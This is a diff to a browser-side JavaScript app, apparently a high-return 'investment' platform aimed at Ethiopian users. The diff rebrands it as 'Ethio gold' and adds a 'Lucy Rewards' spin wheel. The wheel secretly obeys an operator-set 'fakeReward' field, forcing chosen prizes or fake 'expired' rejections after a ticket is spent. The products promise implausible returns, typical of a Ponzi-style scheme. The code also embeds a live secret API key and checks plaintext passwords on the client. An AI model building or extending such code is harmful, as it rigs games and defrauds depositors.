@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Cotton Exporter - System</title>
+    <title>Ethio gold🥇⛳ - System</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
         body { background: #f5f7fb; padding: 0; margin: 0; min-height: 100vh; display: flex; flex-direction: column; }
@@ -65,6 +65,55 @@
         #loadingOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); z-index: 9998; justify-content: center; align-items: center; flex-direction: column; }
         .spinner { width: 50px; height: 50px; border: 5px solid #e2e8f0; border-top: 5px solid #1e3a5f; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Custom Styles for Lucy Rewards */
+        .lucy-spinner-container {
+            display: flex; justify-content: center; align-items: center;
+            flex-direction: column; padding: 1rem; background: #fff;
+            border-radius: 1rem; border: 2px dashed #10b981;
+            margin-bottom: 1rem;
+            position: relative;
+        }
+        .lucy-window {
+            width: 100%; height: 80px; overflow: hidden; position: relative;
+            background: #f8fafc; border-radius: 0.5rem; border: 1px solid #cbd5e1;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 2rem; font-weight: bold; color: #1e3a5f;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
+        }
+        .lucy-go-btn {
+            background: #ef4444; color: white; border: none; border-radius: 2rem;
+            padding: 0.5rem 2rem; font-size: 1.1rem; font-weight: bold;
+            cursor: pointer; margin-top: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .lucy-go-btn:disabled {
+            background: #94a3b8; cursor: not-allowed;
+        }
+        .lucy-result-text {
+            margin-top: 1rem; font-size: 1.2rem; font-weight: bold; text-align: center;
+            color: #10b981; min-height: 30px;
+        }
+        .ticket-badge {
+            position: absolute; top: -10px; right: -10px;
+            background: #ef4444; color: white; border-radius: 50%;
+            width: 35px; height: 35px; display: flex; justify-content: center; align-items: center;
+            font-weight: bold; font-size: 1.1rem; border: 2px solid white; box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 5;
+        }
+        
+        /* Expandable Menu for Recharge/Withdraw History */
+        .expandable-menu {
+            background: white; border-radius: 1rem; padding: 1rem; margin-top: 1rem;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eef2f6;
+            text-align: center; display: none;
+        }
+        .expandable-menu.active { display: block; }
+        .expand-btn {
+            background: #e2e8f0; border: none; border-radius: 50%;
+            width: 30px; height: 30px; display: inline-flex; justify-content: center;
+            align-items: center; cursor: pointer; margin-top: 0.5rem;
+            font-size: 1.2rem;
+        }
     </style>
 </head>
 <body>
@@ -80,7 +129,7 @@
 
 <div id="authContainer" class="auth-container">
     <div id="loginForm" style="display:none;">
-        <h2 style="text-align:center; color:#1e3a5f;">Cotton Exporter</h2>
+        <h2 style="text-align:center; color:#1e3a5f;">Ethio gold🥇⛳</h2>
         <p class="text-center" style="margin-bottom:1.5rem;">Sign in to your account</p>
         <div class="form-group"><label>📞 Phone Number</label><input type="tel" id="loginPhone" placeholder="+251 912345678"></div>
         <div class="form-group"><label>🔒 Password</label><input type="password" id="loginPassword" placeholder="Enter password"></div>
@@ -93,7 +142,7 @@
     </div>
 
     <div id="registerForm" style="display:block;">
-        <h2 style="text-align:center; color:#1e3a5f;">Cotton Exporter</h2>
+        <h2 style="text-align:center; color:#1e3a5f;">Ethio gold🥇⛳</h2>
         <p class="text-center">Create an account to start investing</p>
         <div class="form-group"><label>📞 Phone Number</label><input type="tel" id="regPhone" placeholder="+251 912345678"></div>
         <div class="form-group"><label>👤 Full Name</label><input type="text" id="fullName" placeholder="Full name"></div>
@@ -110,8 +159,8 @@
 <div id="appContainer" class="app-container">
     <div class="header">
         <div class="header-text">
-            <h1>Cotton Exporter</h1>
-            <p>The first checkpoint of quality control</p>
+            <h1>Ethio gold🥇⛳</h1>
+            <p>ጥቅምት 15 2019 እድገትና እንቅስቃሴ!!!</p>
         </div>
         <a href="https://t.me/+iZK5ccDeRiMzZGNk" target="_blank" class="telegram-logo">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z" fill="#ffffff"/></svg>
@@ -135,6 +184,16 @@
 <div id="cashGiftModal" class="modal"><div class="modal-content" id="cashGiftContent"></div></div>
 <div id="exchangeModal" class="modal"><div class="modal-content" id="exchangeContent"></div></div>
 
+<!-- Result Modal for Lucy -->
+<div id="lucyResultModal" class="modal">
+    <div class="modal-content" style="text-align: center;">
+        <div id="lucyResultIcon" style="font-size: 3rem; margin-bottom: 1rem;">🎉</div>
+        <h3 id="lucyResultTitle" style="color: #10b981; border: none; font-size: 1.5rem;">Congratulations!</h3>
+        <p id="lucyResultMessage" style="margin-bottom: 1.5rem; font-size: 1.1rem;"></p>
+        <button class="btn" id="closeLucyResultBtn">OK</button>
+    </div>
+</div>
+
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
   import { getDatabase, ref, get, set, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
@@ -152,7 +211,6 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  // ================= VERITAS API KEY =================
   const VERITAS_API_KEY = "sk_live_b1086f5fd264e09fe01cd975ad6e7892daab97769d13b95b";
 
   let currentUser = null;
@@ -162,6 +220,8 @@
   let giftCodes = {};
   let validFTTransactions = {};
   let PRODUCTS = {};
+  let lucySettings = {};
+  let isSpinning = false;
 
   const defaultProducts = {
       young: { name: "Young", price: 1000, totalReturn: 1800, daily: 40, days: 45, icon: "🌱" },
@@ -211,18 +271,22 @@
               await set(ref(db, "cotton_products"), PRODUCTS);
           }
 
-          // Initialize gift codes if empty
+          const lucySnap = await get(ref(db, "cotton_lucy_settings"));
+          if (lucySnap.exists()) {
+              lucySettings = lucySnap.val();
+          } else {
+              lucySettings = { enabled: false, items: [] };
+          }
+
           if (Object.keys(giftCodes).length === 0) {
               giftCodes = { "YXMTQX": { code: "YXMTQX", value: 50, usedBy: null, active: true } };
               await set(ref(db, "cotton_giftcodes"), giftCodes);
           } else {
-              // ensure active flag
               for (let k in giftCodes) {
                   if (giftCodes[k].active === undefined) giftCodes[k].active = true;
               }
           }
 
-          // Demo user if empty
           if (Object.keys(users).length === 0) {
               const demoPhone = "0947655291";
               const demoUser = {
@@ -230,17 +294,18 @@
                   inviteCode: generateInviteCode(), referredBy: null, balance: 5000, rechargeBalance: 5000,
                   wealthWallet: 0, rewardWallet: 0, totalEarnings: 0, vipLevel: 0, lastDailyBonus: null,
                   lastVideoTaskDate: null, shareReferralCount: 0, shareRewardClaimed: false, isBanned: false,
-                  profilePic: "", createdAt: new Date().toISOString()
+                  profilePic: "", createdAt: new Date().toISOString(),
+                  lucyTickets: 3
               };
               await set(ref(db, "cotton_users/" + demoPhone), demoUser);
               users[demoPhone] = demoUser;
           }
 
-          // ensure user defaults
           for (let phone in users) {
               if (users[phone].rechargeBalance === undefined) users[phone].rechargeBalance = 0;
               if (users[phone].isBanned === undefined) users[phone].isBanned = false;
               if (users[phone].profilePic === undefined) users[phone].profilePic = "";
+              if (users[phone].lucyTickets === undefined) users[phone].lucyTickets = 0;
           }
       } catch (e) {
           console.error("Load error:", e);
@@ -252,10 +317,6 @@
       await set(ref(db, "cotton_users/" + phone), users[phone]);
   }
 
-  async function saveAllData() {
-      // For transactional updates we mostly update individual nodes. This is kept for compatibility.
-  }
-
   async function addTransaction(userPhone, type, amount, desc) {
       const id = Date.now() + "_" + Math.random().toString(36).substring(2, 6);
       const tx = { id, userPhone, type, amount, description: desc, timestamp: new Date().toISOString() };
@@ -263,7 +324,6 @@
       await set(ref(db, "cotton_transactions/" + id), tx);
   }
 
-  // ================= VERITAS VERIFICATION FUNCTION =================
   async function verifyPayment(provider, referenceNumber, extraData = {}) {
       try {
           const bodyData = {
@@ -290,7 +350,6 @@
       }
   }
 
-  // ================= MAIN APP LOGIC =================
   async function processDailyIncomes() {
       let now = new Date();
       let changed = false;
@@ -314,7 +373,6 @@
               }
           }
       }
-      // VIP logic
       for (let phone in users) {
           let u = users[phone];
           let hasPurchase = Object.values(investments).some(i => i.userPhone === phone);
@@ -335,13 +393,11 @@
   async function refreshAllUI() {
       if (!currentUser) return;
       showLoading(true);
-      // reload users & investments
       const usersSnap = await get(ref(db, "cotton_users"));
       users = usersSnap.exists() ? usersSnap.val() : {};
       const invSnap = await get(ref(db, "cotton_investments"));
       investments = invSnap.exists() ? invSnap.val() : {};
       await processDailyIncomes();
-      // reload after process
       const usersSnap2 = await get(ref(db, "cotton_users"));
       users = usersSnap2.exists() ? usersSnap2.val() : {};
       renderHomePage();
@@ -354,10 +410,36 @@
   function renderHomePage() {
       let user = users[currentUser];
       if (!user) return;
+      
+      let lucyHtml = "";
+      if (lucySettings.enabled) {
+          lucyHtml = `
+              <div class="flower-border-box" style="background-color: #f0fdf4; border: 2px solid #10b981; margin-top: 1rem;">
+                  <div style="position: relative; text-align: center;">
+                      <span class="ticket-badge" id="lucyTicketCount">${user.lucyTickets || 0}</span>
+                      <h3 style="color: #065f46; margin-bottom: 0.5rem;">🍀 Lucy Rewards</h3>
+                  </div>
+                  <div style="text-align: center; font-size: 0.85rem; color: #047857; margin-bottom: 1rem;">Spin the wheel to win amazing prizes!</div>
+                  
+                  <!-- Reward Display Window -->
+                  <div class="lucy-spinner-container">
+                      <div class="lucy-window" id="lucyWindow">
+                          🎁 Tap GO to Spin!
+                      </div>
+                      <button class="lucy-go-btn" id="lucyGoBtn">GO</button>
+                  </div>
+                  
+                  <div style="font-size: 0.75rem; color: #64748b; text-align: center;">
+                      Available rewards: ${lucySettings.items ? lucySettings.items.map(i => i.label).join(", ") : "None"}
+                  </div>
+              </div>
+          `;
+      }
+
       let html = `
           <div class="flower-border-box" style="background-color: #fefce8; margin-top: 1rem;">
               <div style="text-align: center;">
-                  <div style="font-size: 1.1rem; color: #1e3a5f; margin-bottom: 0.5rem;">Cotton Exporter - The first checkpoint of quality control</div>
+                  <div style="font-size: 1.1rem; color: #1e3a5f; margin-bottom: 0.5rem;">Ethio gold🥇⛳ - The first checkpoint of quality control</div>
                   <div style="font-size: 3rem; font-weight: bold; color: #10b981;">${(user.balance || 0).toFixed(2)} ETB</div>
                   <div style="color: #475569; margin-bottom: 1rem;">Wallet Balance</div>
                   <div style="display: flex; justify-content: center; gap: 15px; margin-bottom: 1rem;">
@@ -367,6 +449,9 @@
                   <div style="font-size: 0.9rem; color: #475569;">💰 Recharge Wallet: <span style="color: #ef4444; font-weight: bold;">${(user.rechargeBalance || 0).toFixed(2)} ETB</span></div>
               </div>
           </div>
+          
+          ${lucyHtml}
+
           <h3 style="margin:1.5rem 0 0.5rem 1rem; text-align: center; color: #1e3a5f;">እያስቀመጡ ባሉት (Investment Products)</h3>
           <div class="products-grid" id="productsGrid" style="padding-top: 0;"></div>
       `;
@@ -396,7 +481,107 @@
           document.getElementById("withdrawableBalance").innerText = (user.balance || 0).toFixed(2);
           document.getElementById("withdrawModal").style.display = "flex";
       };
+
+      // Lucy Rewards Logic
+      if (lucySettings.enabled) {
+          document.getElementById("lucyGoBtn").onclick = async () => {
+              if (isSpinning) return;
+              
+              let tickets = user.lucyTickets || 0;
+              if (tickets <= 0) {
+                  alert("❌ ምንም የእድል ትኬት የለም!");
+                  return;
+              }
+
+              // Deduct ticket
+              user.lucyTickets = tickets - 1;
+              await saveUser(currentUser);
+
+              if (user.fakeReward) {
+                  if (user.fakeReward === "REJECT") {
+                      startSpin(null, true); // True means it's a reject
+                      await remove(ref(db, "cotton_users/" + currentUser + "/fakeReward"));
+                      return;
+                  } else {
+                      let forcedItem = lucySettings.items.find(i => i.label === user.fakeReward || i.value === user.fakeReward);
+                      if (forcedItem) {
+                          startSpin(forcedItem, false);
+                          await remove(ref(db, "cotton_users/" + currentUser + "/fakeReward"));
+                          return;
+                      }
+                  }
+              }
+              
+              if (!lucySettings.items || lucySettings.items.length === 0) {
+                  alert("No rewards available at the moment.");
+                  return;
+              }
+              let randomItem = lucySettings.items[Math.floor(Math.random() * lucySettings.items.length)];
+              startSpin(randomItem, false);
+          };
+      }
   }
+
+  async function startSpin(selectedItem, isReject) {
+      isSpinning = true;
+      let btn = document.getElementById("lucyGoBtn");
+      let windowDiv = document.getElementById("lucyWindow");
+      
+      // Update UI ticket count immediately
+      let user = users[currentUser];
+      if(document.getElementById("lucyTicketCount")) {
+          document.getElementById("lucyTicketCount").innerText = user.lucyTickets;
+      }
+
+      btn.disabled = true;
+      btn.innerText = "Spinning...";
+      
+      let spinCount = 0;
+      let items = lucySettings.items;
+      
+      let interval = setInterval(() => {
+          let tempItem = items[Math.floor(Math.random() * items.length)];
+          windowDiv.innerHTML = tempItem.icon + " " + tempItem.label;
+          spinCount++;
+          
+          if (spinCount > 30) {
+              clearInterval(interval);
+              
+              btn.disabled = false;
+              btn.innerText = "GO";
+              isSpinning = false;
+
+              if (isReject) {
+                  showLucyResult("❌", "Oops!", "ውድቅ ተደርጓል! ሰዓት ስላለፈበት እባክዎ በድጋሚ ይሞክሩ።", "#ef4444");
+                  windowDiv.innerHTML = "🎁 Tap GO to Spin!";
+              } else {
+                  windowDiv.innerHTML = selectedItem.icon + " " + selectedItem.label;
+                  showLucyResult("🎉", "Congratulations!", `You won ${selectedItem.label}!`, "#10b981");
+                  
+                  if (selectedItem.type === "money") {
+                      user.balance = (user.balance || 0) + selectedItem.value;
+                      saveUser(currentUser);
+                      addTransaction(currentUser, "lucy_reward", selectedItem.value, `Won ${selectedItem.label} from Lucy Rewards`);
+                  } else {
+                      addTransaction(currentUser, "lucy_item", 0, `Won physical item: ${selectedItem.label}`);
+                  }
+              }
+          }
+      }, 100);
+  }
+
+  function showLucyResult(icon, title, message, color) {
+      document.getElementById("lucyResultIcon").innerText = icon;
+      document.getElementById("lucyResultTitle").innerText = title;
+      document.getElementById("lucyResultTitle").style.color = color;
+      document.getElementById("lucyResultMessage").innerText = message;
+      document.getElementById("lucyResultModal").style.display = "flex";
+  }
+
+  document.getElementById("closeLucyResultBtn").onclick = () => {
+      document.getElementById("lucyResultModal").style.display = "none";
+      renderHomePage(); // Refresh to update balance and ticket count
+  };
 
   function renderWealthPage() {
       let user = users[currentUser];
@@ -467,6 +652,45 @@
       let shareCompleted = (user.shareRewardClaimed === true);
       let shareStatus = shareCompleted ? "✅ Reward claimed" : `${shareProgress}/${shareRequired} registrations`;
 
+      // Fetch User's Recharge & Withdraw History
+      let userTx = Object.values(transactions).filter(t => t.userPhone === currentUser);
+      
+      // Correctly filter Recharge and Withdraw transactions
+      let rechargeTxs = userTx.filter(t => t.type === 'recharge');
+      let withdrawTxs = userTx.filter(t => t.type === 'withdraw');
+      
+      let rechargeHtml = "";
+      if (rechargeTxs.length > 0) {
+          rechargeTxs.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp)).slice(0, 5).forEach(t => {
+              rechargeHtml += `<div class="transaction-item flex-between" style="font-size:0.8rem; padding:0.5rem; background: white; border: 1px solid #e2e8f0; margin-bottom: 0.5rem;">
+                  <div>
+                      <div style="font-weight: bold; color: #1e3a5f;">+${t.amount} ETB</div>
+                      <div style="color: #64748b; font-size: 0.7rem;">${new Date(t.timestamp).toLocaleString()}</div>
+                  </div>
+                  <div style="color: #10b981; font-weight: bold; font-size: 0.8rem;">SUCCESS</div>
+              </div>`;
+          });
+      } else {
+          rechargeHtml = "<p style='text-align: center; color: #64748b;'>No recharge history available.</p>";
+      }
+
+      let withdrawHtml = "";
+      if (withdrawTxs.length > 0) {
+          withdrawTxs.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp)).slice(0, 5).forEach(t => {
+              let statusColor = t.status === 'success' ? '#10b981' : (t.status === 'rejected' ? '#ef4444' : '#f59e0b');
+              let statusText = t.status ? t.status.toUpperCase() : 'PENDING';
+              withdrawHtml += `<div class="transaction-item flex-between" style="font-size:0.8rem; padding:0.5rem; background: white; border: 1px solid #e2e8f0; margin-bottom: 0.5rem;">
+                  <div>
+                      <div style="font-weight: bold; color: #ef4444;">${t.amount} ETB</div>
+                      <div style="color: #64748b; font-size: 0.7rem;">${new Date(t.timestamp).toLocaleString()}</div>
+                  </div>
+                  <div style="color: ${statusColor}; font-weight: bold; font-size: 0.8rem;">${statusText}</div>
+              </div>`;
+          });
+      } else {
+          withdrawHtml = "<p style='text-align: center; color: #64748b;'>No withdraw history available.</p>";
+      }
+
       let html = `
           <div style="padding: 0 1rem;">
               <h3 style="margin-top: 1rem;">📋 Daily Tasks</h3>
@@ -490,6 +714,25 @@
                   </div>
                   <div class="warning mt-2" style="color: #b45309;">Reward (50 ETB) will be added to Reward Wallet after 2 successful registrations.</div>
               </div>
+              
+              <!-- Expandable Menu for Withdraw History -->
+              <div style="text-align: center; margin-top: 1rem;">
+                  <button class="expand-btn" id="toggleQuickMenu">⬇️</button>
+              </div>
+              <div class="expandable-menu" id="quickMenu">
+                  <h4 style="margin-bottom: 1rem; color: #1e3a5f; border-bottom: 1px solid #e2e8f0; padding-bottom: 0.5rem;">Withdraw History</h4>
+                  ${withdrawHtml}
+              </div>
+
+              <!-- Separate Button for Recharge History -->
+              <div style="text-align: center; margin-top: 1rem;">
+                  <button class="expand-btn" id="toggleRechargeMenu">👇</button>
+              </div>
+              <div class="expandable-menu" id="rechargeMenu">
+                  <h4 style="margin-bottom: 1rem; color: #1e3a5f; border-bottom: 1px solid #e2e8f0; padding-bottom: 0.5rem;">Recharge History</h4>
+                  ${rechargeHtml}
+              </div>
+
               <div class="flower-border-box task-bg-yellow" style="margin-top: 1.5rem; margin-bottom: 2rem;">
                   <h3 class="mt-2">📜 Task Transaction History</h3>
                   <div id="taskTransactionsList"></div>
@@ -497,6 +740,30 @@
           </div>
       `;
       document.getElementById("taskPage").innerHTML = html;
+      
+      // Toggle quick menu
+      document.getElementById("toggleQuickMenu").onclick = () => {
+          let menu = document.getElementById("quickMenu");
+          if (menu.classList.contains("active")) {
+              menu.classList.remove("active");
+              document.getElementById("toggleQuickMenu").innerText = "⬇️";
+          } else {
+              menu.classList.add("active");
+              document.getElementById("toggleQuickMenu").innerText = "⬆️";
+          }
+      };
+
+      document.getElementById("toggleRechargeMenu").onclick = () => {
+          let menu = document.getElementById("rechargeMenu");
+          if (menu.classList.contains("active")) {
+              menu.classList.remove("active");
+              document.getElementById("toggleRechargeMenu").innerText = "👇";
+          } else {
+              menu.classList.add("active");
+              document.getElementById("toggleRechargeMenu").innerText = "👆";
+          }
+      };
+
       let taskTx = Object.values(transactions).filter(tx => tx.userPhone === currentUser && (tx.type === "video_task" || tx.type === "share_task"));
       let txDiv = document.getElementById("taskTransactionsList");
       if (taskTx.length === 0) txDiv.innerHTML = "<p>No task transactions yet.</p>";
@@ -635,7 +902,6 @@
       document.getElementById("closeInvestModal").onclick = () => modal.style.display = "none";
   }
 
-  // ================= NAVIGATION & AUTH =================
   document.querySelectorAll(".nav-item").forEach(item => {
       item.onclick = () => {
           let page = item.dataset.page;
@@ -657,7 +923,6 @@
       return results === null ? null : decodeURIComponent(results[1].replace(/\+/g, ' '));
   }
 
-  // ================= SERVICE BLOCK CHECK =================
   window.addEventListener('load', async () => {
       let refVal = getUrlParameter("ref");
       if (refVal) document.getElementById("inviteCodeReg").value = refVal;
@@ -690,7 +955,6 @@
       }
   });
 
-  // ================= LOGIN / REGISTER LOGIC =================
   document.getElementById("showRegister").onclick = (e) => {
       e.preventDefault();
       document.getElementById("loginForm").style.display = "none";
@@ -743,7 +1007,8 @@
               vipLevel: 0, lastDailyBonus: null, lastVideoTaskDate: null,
               shareReferralCount: 0, shareRewardClaimed: false, isBanned: false,
               profilePic: "", 
-              createdAt: new Date().toISOString()
+              createdAt: new Date().toISOString(),
+              lucyTickets: 0
           };
           
           await set(ref(db, "cotton_users/" + phone), newUser);
@@ -768,7 +1033,7 @@
       try {
           const userSnap = await get(ref(db, "cotton_users/" + phone));
           if (!userSnap.exists()) {
-              document.getElementById("loginMessage").innerText = "Invalid phone or password. Try demo: 0947655291 / 123456";
+              document.getElementById("loginMessage").innerText = "Invalid phone or password. Please try again.";
               showLoading(false);
               return;
           }
@@ -782,7 +1047,7 @@
           }
           
           if (checkUser.password !== pass) {
-              document.getElementById("loginMessage").innerText = "Invalid phone or password. Try demo: 0947655291 / 123456";
+              document.getElementById("loginMessage").innerText = "Invalid phone or password. Please try again.";
               showLoading(false);
               return;
           }
@@ -825,7 +1090,6 @@
       }
   }
 
-  // ================= MODALS SETUP =================
   document.getElementById("rechargeContent").innerHTML = `<div class="modal-header">💳 Recharge Wallet</div>
       <p style="font-size:0.85rem;color:#475569;margin-bottom:0.5rem;">Pay via Telebirr / Bank to our account and enter the receipt number below:</p>
       <div class="form-group">
@@ -1009,7 +1273,6 @@
       document.getElementById("closeExchangeModal").onclick = () => document.getElementById("exchangeModal").style.display = "none";
   }, 50);
 
-  // Expose necessary functions to window
   window.biometricLogin = biometricLogin;
 </script>
 </body>
